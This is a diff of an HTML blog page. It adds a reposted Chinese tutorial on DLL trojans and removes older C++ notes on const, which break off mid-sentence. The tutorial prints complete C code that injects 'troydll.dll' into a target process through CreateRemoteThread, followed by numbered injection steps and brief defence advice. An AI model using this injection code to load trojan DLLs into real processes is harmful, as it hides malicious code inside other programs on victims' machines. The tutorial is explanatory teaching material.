@@ -9,7 +9,7 @@
 
 <meta name="author" content="Han Yi"> 
 
-<meta name="description" content="　　动态链接库DLL实现了库的共享，体现了代码重用的思想。我们可以把广泛的、具有共性的、能够多次被利用的函数和类定义在库中。这样，在再次使用这些函数和类的时候，就不再需要重新添加与这些函数和类相关的代码。具有共性的问题大致有哪些呢？笔者归纳如下： 　　（1）通用的算法 　　图像处理、视频音频解码 &hellip;"> <meta name="keywords" content="">
+<meta name="description" content="　　从前文可知，DLL在程序编制中可作出巨大贡献，它提供了具共性代码的复用能力。但是，正如一门高深的武学，若被掌握在正义之侠的手上，便可助其仗义江湖；但若被掌握在邪恶之徒的手上，则必然在江湖上掀起腥风血雨。DLL正是一种这样的武学。DLL一旦染上了魔性，就不再是正常的DLL程序，而是DLL木马， &hellip;"> <meta name="keywords" content="">
 
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -97,6 +97,211 @@ $(document).ready(
 </header>
 
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-qi/">
+		
+			Visual C++动态链接库编程（七）</a>
+	</h2>
+	<div class="entry-content">
+		<p>　　从前文可知，DLL在<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>编制中可作出巨大贡献，它提供了具共性代码的复用能力。但是，正如一门高深的武学，若被掌握在正义之侠的手上，便可助其仗义江湖；但若被掌握在邪恶之徒的手上，则必然在江湖上掀起腥风血雨。DLL正是一种这样的武学。DLL一旦染上了魔性，就不再是正常的DLL程序，而是DLL木马，一种恶贯满盈的病毒，令特洛伊一夜之间国破家亡。</p>
+
+<p>　　<strong>DLL木马的原理</strong></p>
+
+<p>　　DLL木马的实现原理是编程者在DLL中包含木马程序代码，随后在目标主机中选择特定目标进程，以某种方式强行指定该进程调用包含木马程序的DLL，最终达到侵袭目标系统的目的。</p>
+
+<p>　　正是DLL程序自身的特点决定了以这种形式加载木马不仅可行，而且具有良好的隐藏性：</p>
+
+<p>　　（1）DLL程序被映射到宿主进程的地址空间中，它能够共享宿主进程的资源，并根据宿主进程在目标主机的级别非法访问相应的系统资源；</p>
+
+<p>　　（2）DLL程序没有独立的进程地址空间，从而可以避免在目标主机中留下&#8221;蛛丝马迹&#8221;，达到隐蔽自身的目的。</p>
+
+<p>　　DLL木马实现了&#8221;真隐藏&#8221;，我们在任务管理器中看不到木马&#8221;进程&#8221;，它完全溶进了系统的内核。与&#8221;真隐藏&#8221;对应的是&#8221;假隐藏&#8221;，&#8221;假隐藏&#8221;木马把自己注册成为一个服务。虽然在任务管理器中也看不到这个进程，但是&#8221;假隐藏&#8221;木马本质上还具备独立的进程空间。&#8221;假隐藏&#8221;只适用于Windows9x的系统，对于基于WINNT的<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>，通过服务管理器，我们可以发现系统中注册过的服务。</p>
+
+<p>　　DLL木马注入其它进程的方法为远程线程插入。</p>
+
+<p>　　远程线程插入技术指的是通过在另一个进程中创建远程线程的方法进入那个进程的内存地址空间。将木马程序以DLL的形式实现后，需要使用插入到目标进程中的远程线程将该木马DLL插入到目标进程的地址空间，即利用该线程通过调用Windows API LoadLibrary函数来加载木马DLL，从而实现木马对系统的侵害。</p>
+
+<p>　　<strong>DLL木马注入程序</strong></p>
+
+<p>　　这里涉及到一个非常重要的Windows API――CreateRemoteThread。与之相比，我们所习惯使用的CreateThread API函数只能在进程自身内部产生一个新的线程，而且被创建的新线程与主线程共享地址空间和其他资源。而CreateRemoteThread则不同，它可以在另外的进程中产生线程！CreateRemoteThread有如下特点：</p>
+
+<p>　　（1）CreateRemoteThread较CreateThread多一个参数hProcess，该参数用于指定要创建线程的远程进程，其函数原型为：</p>
+
+<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
+<tr>
+<td>HANDLE CreateRemoteThread(
+　HANDLE hProcess, //远程进程句柄
+　LPSECURITY_ATTRIBUTES lpThreadAttributes,
+　SIZE_T dwStackSize,
+　LPTHREAD_START_ROUTINE lpStartAddress,
+　LPVOID lpParameter,
+　DWORD dwCreationFlags,
+　LPDWORD lpThreadId
+);</td>
+</tr>
+</table>
+
+
+<p>　　（2）线程函数的代码不能位于我们用来注入DLL木马的进程所在的地址空间中。也就是说，我们不能想当然地自己写一个函数，并把这个函数作为远程线程的入口函数；</p>
+
+<p>　　（3）不能把本进程的指针作为CreateRemoteThread的参数，因为本进程的内存空间与远程进程的不一样。
+　　以下<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>由作者Shotgun的DLL木马注入程序简化而得（<a target="_blank" href="http://www.mydown.com/code/245/245731.html"><font color="#1a1ae6">单击此处下载</font></a>，在经典书籍《Windows核心编程》中我们也可以看到类似的例子），它将d盘根目录下的troydll.dll插入到ID为4000的进程中：</p>
+
+<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
+<tr>
+<td>#include &lt;windows.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;void CheckError ( int, int, char *); //出错处理函数
+
+PDWORD pdwThreadId;
+HANDLE hRemoteThread, hRemoteProcess;
+DWORD fdwCreate, dwStackSize, dwRemoteProcessId;
+PWSTR pszLibFileRemote=NULL;
+
+void main(int argc,char **argv)
+{
+　int iReturnCode;
+　char lpDllFullPathName[MAX_PATH];
+　WCHAR pszLibFileName[MAX_PATH]={0};
+
+　dwRemoteProcessId = 4000;
+　strcpy(lpDllFullPathName, &#8220;d:&#92;troydll.dll&#8221;);
+　//将DLL文件全路径的ANSI码转换成UNICODE码
+　iReturnCode = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS,
+　　lpDllFullPathName, strlen(lpDllFullPathName),
+　　pszLibFileName, MAX_PATH);
+　CheckError(iReturnCode, 0, &#8220;MultByteToWideChar&#8221;);
+　//打开远程进程
+　hRemoteProcess = OpenProcess(PROCESS_CREATE_THREAD | //允许创建线程
+　　PROCESS_VM_OPERATION | //允许VM操作
+　　PROCESS_VM_WRITE, //允许VM写
+　　FALSE, dwRemoteProcessId );
+　CheckError( (int) hRemoteProcess, NULL, &#8220;Remote Process not Exist or Access Denied!&#8221;);
+　//计算DLL路径名需要的内存空间
+　int cb = (1 + lstrlenW(pszLibFileName)) * sizeof(WCHAR);
+　pszLibFileRemote = (PWSTR) VirtualAllocEx( hRemoteProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
+　CheckError((int)pszLibFileRemote, NULL, &#8220;VirtualAllocEx&#8221;);
+　//将DLL的路径名复制到远程进程的内存空间
+　iReturnCode = WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (PVOID) pszLibFileName, cb, NULL);
+　CheckError(iReturnCode, false, &#8220;WriteProcessMemory&#8221;);
+　//计算LoadLibraryW的入口地址
+　PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)
+　　　GetProcAddress(GetModuleHandle(TEXT(&#8220;Kernel32&#8221;)), &#8220;LoadLibraryW&#8221;);
+　CheckError((int)pfnStartAddr, NULL, &#8220;GetProcAddress&#8221;);
+　//启动远程线程，通过远程线程调用用户的DLL文件
+　hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL);
+　CheckError((int)hRemoteThread, NULL, &#8220;Create Remote Thread&#8221;);
+　//等待远程线程退出
+　WaitForSingleObject(hRemoteThread, INFINITE);
+　//清场处理
+　if (pszLibFileRemote != NULL)
+　{
+　　VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);
+　}
+　if (hRemoteThread != NULL)
+　{
+　　CloseHandle(hRemoteThread );
+　}
+　if (hRemoteProcess!= NULL)
+　{
+　　CloseHandle(hRemoteProcess);
+　}
+}
+
+//错误处理函数CheckError()
+void CheckError(int iReturnCode, int iErrorCode, char *pErrorMsg)
+{
+　if(iReturnCode==iErrorCode)
+　{
+　　printf(&#8220;%s Error:%d\n\n&#8221;, pErrorMsg, GetLastError());
+　　//清场处理
+　　if (pszLibFileRemote != NULL)
+　　{
+　　　VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);
+　　}
+　　if (hRemoteThread != NULL)
+　　{
+　　　CloseHandle(hRemoteThread );
+　　}
+　　if (hRemoteProcess!= NULL)
+　　{
+　　　CloseHandle(hRemoteProcess);
+　　}
+　　exit(0);
+　}
+}</td>
+</tr>
+</table>
+
+
+<p>　　从DLL木马注入程序的源代码中我们可以分析出DLL木马注入的一般步骤为：</p>
+
+<p>　　（1）取得宿主进程（即要注入木马的进程）的进程ID dwRemoteProcessId；</p>
+
+<p>　　（2）取得DLL的完全路径，并将其转换为宽字符模式pszLibFileName；</p>
+
+<p>　　（3）利用Windows API OpenProcess打开宿主进程，应该开启下列选项：</p>
+
+<p>　　a.PROCESS_CREATE_THREAD：允许在宿主进程中创建线程；</p>
+
+<p>　　b.PROCESS_VM_OPERATION：允许对宿主进程中进行VM操作；</p>
+
+<p>　　c.PROCESS_VM_WRITE：允许对宿主进程进行VM写。</p>
+
+<p>　　（4）利用Windows API VirtualAllocEx函数在远程线程的VM中分配DLL完整路径宽字符所需的存储空间，并利用Windows API WriteProcessMemory函数将完整路径写入该存储空间；</p>
+
+<p>　　（5）利用Windows API GetProcAddress取得Kernel32模块中LoadLibraryW函数的地址，这个函数将作为随后将启动的远程线程的入口函数；</p>
+
+<p>　　（6）利用Windows API CreateRemoteThread启动远程线程，将LoadLibraryW的地址作为远程线程的入口函数地址，将宿主进程里被分配空间中存储的完整DLL路径作为线程入口函数的参数以另其启动指定的DLL；</p>
+
+<p>　　（7）清理现场。</p>
+
+<p>　　<strong>DLL木马的防治</strong></p>
+
+<p>　　从DLL木马的原理和一个简单的DLL木马程序中我们学到了DLL木马的工作方式，这可以帮助我们更好地理解DLL木马病毒的防治手段。</p>
+
+<p>　　一般的木马被植入后要打开一<a target="_blank" href="http://product.yesky.com/net/" class="bluekey"><font color="#003399">网络</font></a>端口与攻击程序通信，所以防火墙是抵御木马攻击的最好方法。防火墙可以进行数据包过滤检查，我们可以让防火墙对通讯端口进行限制，只允许系统接受几个特定端口的数据请求。这样，即使木马植入成功，攻击者也无法进入到受侵系统，防火墙把攻击者和木马分隔开来了。</p>
+
+<p>　　对于DLL木马，一种简单的观察方法也许可以帮助用户发现之。我们查看运行进程所依赖的DLL，如果其中有一些莫名其妙的DLL，则可以断言这个进程是宿主进程，系统被植入了DLL木马。&#8221;道高一尺，魔高一丈&#8221;，现如今，DLL木马也发展到了更高的境界，它们看起来也不再&#8221;莫名其妙&#8221;。在最新的一些木马里面，开始采用了先进的DLL陷阱技术，编程者用特洛伊DLL替换已知的系统DLL。特洛伊DLL对所有的函数调用进行过滤，对于正常的调用，使用函数转发器直接转发给被替换的系统DLL；对于一些事先约定好的特殊情况，DLL会执行一些相应的操作。</p>
+
+<p>　　本文给出的只是DLL木马最简单情况的介绍，读者若有兴趣深入研究，可以参考其它资料。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-04-05T15:21:07+08:00" pubdate data-updated="true">2008-04-05</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>
+
+</div>
+
+
+	
+		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-qi//posts/21/index.html#disqus_thread">Comments</a></span>
+	
+</div></article>
 
 
     <article class="post">
@@ -3648,216 +3853,6 @@ int main(int argc, char* argv[])
 
 	
 		<span class="comments"><a href="/blog/2008/03/30/C-xue-xi-bi-ji-chong-wen-ji-hua-zhi-er//posts/21/index.html#disqus_thread">Comments</a></span>
-	
-</div></article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2008/03/29/C-xue-xi-bi-ji-chong-wen-ji-hua-zhi-yi/">
-		
-			C++学习笔记(重温计划之一)</a>
-	</h2>
-	<div class="entry-content">
-		<p>1、C++新特点</p>
-
-<p> 这里所说的新特点,是相较于C语言而言的.本笔记旨在加强记忆和理解,本身内容并未超出教材的范围.我们仍将沿用《面向对象程序设计c++版》（刘振安，机械工业出版）和《c++程序设计教程第二版》（钱能，清华大学出版社）的基本思路，开始都是最基本的东西。</p>
-
-<p> C++与C语言的关系，向来是众说纷纭的。但在我结束首轮学习之后发现，C++与C的关系，仅表明C++包含了C，C++完全可以当作一门新语言来学习，有C基础的人也未必比没有基础而开始学习C++的占多大优势。以下是C++一则例示:</p>
-
-<p>/<em>功能:将结构的两个域值相加，乘以2再减去50</em>/</p>
-
-<h1>include&lt;iostream&gt;</h1>
-
-<p>//&mdash;&mdash;&mdash;&mdash;hanyi.name 1.1&mdash;&mdash;&mdash;&mdash;&mdash;</p>
-
-<p>using namespace std;</p>
-
-<p>int result(int,int);</p>
-
-<p>const int k = 2;</p>
-
-<p>struct Point{
- 
- int x,y;</p>
-
-<p>};</p>
-
-<p>int main(){</p>
-
-<p> int z(0),b(50);
- 
- Point a;
- 
- cout  &lt;&lt;&ldquo;输入两个整数（以空格区分）:&rdquo;;</p>
-
-<p>    cin  &gt;&gt;a.x&gt;&gt;a.y;</p>
-
-<p>    z = (a.x + a.y)*k;</p>
-
-<p>    z = result(z,b);</p>
-
-<p>    cout  &lt;&lt;&ldquo;计算结果如下:&rdquo;&lt;&lt;endl;</p>
-
-<p>    cout  &lt;&lt;&ldquo;((&rdquo;&lt;&lt;a.x&lt;&lt;&ldquo;+&rdquo;&lt;&lt;a.y&lt;&lt;&ldquo;)*&rdquo;&lt;&lt;k&lt;&lt;&ldquo;)-&rdquo;&lt;&lt;b&lt;&lt;&ldquo;=&rdquo;&lt;&lt;z&lt;&lt;endl;</p>
-
-<p>    return 0;</p>
-
-<p>}</p>
-
-<p>int result(int a,int b){</p>
-
-<p> a = a - b;
- 
- return a;</p>
-
-<p>}</p>
-
-<p> 下面对以上内容作一说明:</p>
-
-<p> 1、c++源程序以.cpp作为文件扩展名，其中main()主函数只能有一个。由于main()是过程化语言的标志，c++也被称为混合型语言。</p>
-
-<p> 2、注释符号基本以/<em> </em>/和左起开头//为主。</p>
-
-<p> 3、引入“流”的概念，例如cin和cout分别是c++标准输入输出库iostream的一员，这类库总称为STL(standard library标准函数库)。endl类似于转义字符\n，功能均为换行。</p>
-
-<p> 4、头文件中iostream.h的.h可以省略，但必须新标准类库的使用头文件载入的方法:using namespace std;</p>
-
-<p> 5、对象定义和初始化，新引入了int z(0);定义的方法，此方法功能与int z = 0相同。</p>
-
-<p> 6、函数必须有类型声明，例如int main()，且必须有返回值return。当然void类型也是被允许的，但不和return同时使用。</p>
-
-<p> 7、const修饰符。</p>
-
-<p>       在c语言中，我们使用宏定义#define定义常量，这里推荐使用const。以下文章摘自csdn: </p>
-
-<p>====================================================================================     </p>
-
-<h3 style="margin: 13pt 0cm"><span style="font-family: 宋体"><font size="3">对于基本声明</font></span></h3>
-
-
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">1.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">const int r=100; //</font></span></font><font size="3"><span style="font-family: 宋体">标准</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">变量声明加初始化，因为默认内部连接所以必须被初始化，其作用域为此文件，编译器经过类型检查后直接用</span><span lang="EN-US"><font face="Times New Roman">100</font></span><span style="font-family: 宋体">在编译时替换</span></font></p>
-
-
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">2.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">extend const int r=100; //</font></span></font><font size="3"><span style="font-family: 宋体">将</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">改为外部连接，作用于扩大至全局，编译时会分配内存，并且可以不进行初始化，仅仅作为声明，编译器认为在程序其他地方进行了定义</span></font></p>
-
-
-<p><span lang="EN-US"><font face="Times New Roman"><font size="3">3.</font><span style="font: 7pt 'Times New Roman'">       </span></font></span><font size="3"><span lang="EN-US"><font face="Times New Roman">const int r[ ]={1,2,3,4};</font></span></font><font size="3"><span lang="EN-US"><font face="Times New Roman">struct S {int a,b;};
-const S s[ ]={(1,2),(3.4)}; //<span style="font-family: 宋体">以上两种都是常量集合，编译器会为其分配内存，所以不能在编译期间使用其中的值，例如：</span><span lang="EN-US"><font face="Times New Roman">int temp[r[2]];</font></span><span style="font-family: 宋体">这样的编译器会报告不能找到常量表达式</span></font></span></font></p>
-
-<h3 style="margin: 13pt 0cm"><span style="font-family: 宋体"><font size="3">对于指针</font></span></h3>
-
-
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">1.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">const int *r=&amp;x; //</font></span></font><font size="3"><span style="font-family: 宋体">声明</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">为一个指向常量的</span><span lang="EN-US"><font face="Times New Roman">x</font></span><span style="font-family: 宋体">的指针，</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">指向的对象不能被修改，但他可以指向任何地址的常量</span></font></p>
-
-
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">2.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">int const *r=&amp;x; //</font></span></font><font size="3"><span style="font-family: 宋体">与用法</span><span lang="EN-US"><font face="Times New Roman">1</font></span><span style="font-family: 宋体">完全等价，没有任何区别</span></font></p>
-
-
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">3.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">int * const r=&amp;x; //</font></span></font><font size="3"><span style="font-family: 宋体">声明</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">为一个常量指针，他指向</span><span lang="EN-US"><font face="Times New Roman">x</font></span><span style="font-family: 宋体">，</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">这个指针的指向不能被修改，但他指向的地址的内容可以修改</span></font></p>
-
-
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">4.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">const int * const r=&amp;x; //</font></span></font><font size="3"><span style="font-family: 宋体">综合</span><span lang="EN-US"><font face="Times New Roman">1</font></span><span style="font-family: 宋体">、</span><span lang="EN-US"><font face="Times New Roman">3</font></span><span style="font-family: 宋体">用法，</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">是一个指向常量的常量型指针</span></font></p>
-
-
-
-
-<h3 style="margin: 13pt 0cm"><span style="font-family: 宋体"><font size="3">对于类型检查</font></span></h3>
-
-
-<p><p style="margin: 0cm 0cm 0pt" class="MsoNormal"><font size="3"><span style="font-family: 宋体">可以把一个非</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象赋给一个指向</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">的指针，因为有时候我们不想从这个指针来修改其对象的值；但是不可以把一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象赋值给一个非</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">指针，因为这样可能会通过这个指针改变指向对象的值，但也存在使这种操作通过的合法化写法，使用类型强制转换可以通过指针改变</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">const int r=100;
-int * ptr = const_cast&lt;int<em>&gt;(&amp;r);<span>  </span>//C++</font></span><font size="3"><span style="font-family: 宋体">标准，</span><span lang="EN-US"><font face="Times New Roman">C</font></span><span style="font-family: 宋体">语言使用：</span><span lang="EN-US"><font face="Times New Roman">int * ptr =(int</em>)&amp;r;</font></span></font>
-<h3 style="margin: 13pt 0cm"><span style="font-family: 宋体"><font size="3">对于字符数组</font></span></h3>
-<p style="margin: 0cm 0cm 0pt" class="MsoNormal"><font size="3"><span style="font-family: 宋体">如</span><span lang="EN-US"><font face="Times New Roman">char * name = “china”; </font></span><span style="font-family: 宋体">这样的语句，在编译时是能够通过的，但是</span><span lang="EN-US"><font face="Times New Roman">”china”</font></span><span style="font-family: 宋体">是常量字符数组，任何想修改他的操作也能通过编译但会引起运行时错误，如果我们想修改字符数组的话就要使用</span><span lang="EN-US"><font face="Times New Roman">char name[ ] = “china”; </font></span><span style="font-family: 宋体">这种形式。</span></font></p></p>
-
-<p><h3 style="margin: 13pt 0cm"><span style="font-family: 宋体"><font size="3">对于函数</font></span></h3>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">1.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">void Fuction1 ( const int r ); //</font></span></font><font size="3"><span style="font-family: 宋体">此处为参数传递</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">值，意义是变量初值不能被函数改变</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">2.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">const int Fuction1 (int); //</font></span></font><font size="3"><span style="font-family: 宋体">此处返回</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">值，意思指返回的原函数里的变量的初值不能被修改，但是函数按值返回的这个变量被制成副本，能不能被修改就没有了意义，它可以被赋给任何的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">或非</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">类型变量，完全不需要加上这个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">关键字。但这只对于内部类型而言（因为内部类型返回的肯定是一个值，而不会返回一个变量，不会作为左值使用），对于用户自定义类型，返回值是常量是非常重要的，见下面条款</span><span lang="EN-US"><font face="Times New Roman">3</font></span><span style="font-family: 宋体">。</span></font></p></p>
-
-<p><p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">3.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">Class CX; //</font></span></font><span style="font-family: 宋体"><font size="3">内部有构造函数，声明如</font></span><font size="3"><span lang="EN-US"><font face="Times New Roman">CX(int r =0)
-CX<span>  </span>Fuction1 () { return CX(); }
-const CX Fuction2 () { return CX(); }
-</font></span><span style="font-family: 宋体">如有上面的自定义类</span><span lang="EN-US"><font face="Times New Roman">CX</font></span><span style="font-family: 宋体">，和函数</span><span lang="EN-US"><font face="Times New Roman">Fuction1()</font></span><span style="font-family: 宋体">和</span><span lang="EN-US"><font face="Times New Roman">Fuction2(),</font></span><span style="font-family: 宋体">我们进行如下操作时：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">Fuction1() = CX(1); //</font></span><span style="font-family: 宋体"><font size="3">没有问题，可以作为左值调用</font></span><span lang="EN-US">
-<font size="3" face="Times New Roman">Fuction2() = CX(1); //</font></span><font size="3"><span style="font-family: 宋体">编译错误，</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">返回值禁止作为左值调用。因为左值把返回值作为变量会修改其返回值，</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">声明禁止这种修改。</span></font></p>
-
-<p><p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><span lang="EN-US"><font face="Times New Roman"><font size="3">4.</font><span style="font: 7pt 'Times New Roman'">       </span></font></span><font size="3"><span style="font-family: 宋体">函数中指针的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">传递和返回：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">int F1 (const char * pstr); //</font></span><font size="3"><span style="font-family: 宋体">作为传递的时候使用</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">修饰可以保证不会通过这个指针来修改传递参数的初值，这里在函数内部任何修改</span><span lang="EN-US"><font face="Times New Roman">*pstr</font></span><span style="font-family: 宋体">的企图都会引起编译错误。</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">const char * F2 (); //</font></span><font size="3"><span style="font-family: 宋体">意义是函数返回的指针指向的对象是一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象，它必须赋给一个同样是指向</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象的指针。</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">const char * const F3(); //</font></span><font size="3"><span style="font-family: 宋体">比上面多了一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">，这个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">的意义只是在他被用作左值时有效，它表明了这个指针除了指向</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象外，它本身也不能被修改，所以就不能当作左值来处理。</span></font></p>
-
-<p><p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><span lang="EN-US"><font face="Times New Roman"><font size="3">5.</font><span style="font: 7pt 'Times New Roman'">       </span></font></span><font size="3"><span style="font-family: 宋体">函数中引用的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">传递：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">void F1 ( const X&amp; px); //</font></span><font size="3"><span style="font-family: 宋体">这样的一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">引用传递和最普通的函数按值传递的效果是一模一样的，他禁止对引用的对象的一切修改，唯一不同的是按值传递会先建立一个类对象的副本，然后传递过去，而它直接传递地址，所以这种传递比按值传递更有效。</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">**</font></span><font size="3"><span style="font-family: 宋体">另外只有引用的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">传递可以传递一个<strong>临时对象</strong>，因为临时对象都是</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">属性，且是不可见的，他短时间存在一个局部域中，所以不能使用指针，只有引用的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">传递能够捕捉到这个家伙。</span></font>
-<h3 style="margin: 13pt 0cm"><span style="font-family: 宋体"><font size="3">对于类</font></span></h3>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><span lang="EN-US"><font face="Times New Roman"><font size="3">1.</font><span style="font: 7pt 'Times New Roman'">       </span></font></span><font size="3"><span style="font-family: 宋体">首先，对于</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">的成员变量，只能在构造函数里使用初始化成员列表来初始化，试图在构造函数体内进行初始化</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员变量会引起编译错误。初始化成员列表形如：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">X:: X ( int ir ): r(ir) {} //</font></span><font size="3"><span style="font-family: 宋体">假设</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">是类</span><span lang="EN-US"><font face="Times New Roman">X</font></span><span style="font-family: 宋体">的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员变量</span></font></p>
-
-<p><p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font face="Times New Roman"><span lang="EN-US"><font size="3">2.</font><span style="font: 7pt 'Times New Roman'">       </span></span><span lang="EN-US"><font size="3">const</font></span></font><font size="3"><span style="font-family: 宋体">成员函数。提到这个概念首先要谈到</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象，正象内置类型能够定义</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象一样（</span><span lang="EN-US"><font face="Times New Roman">const int r=10;</font></span><span style="font-family: 宋体">），用户自定义类型也可以定义</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象</span><span lang="EN-US"><font face="Times New Roman">(const X px(10);)</font></span><span style="font-family: 宋体">，编译器要保证这个对象在其生命周期内不能够被改变。如果你定义了这样的一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象，那么对于这个对象的一切非</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 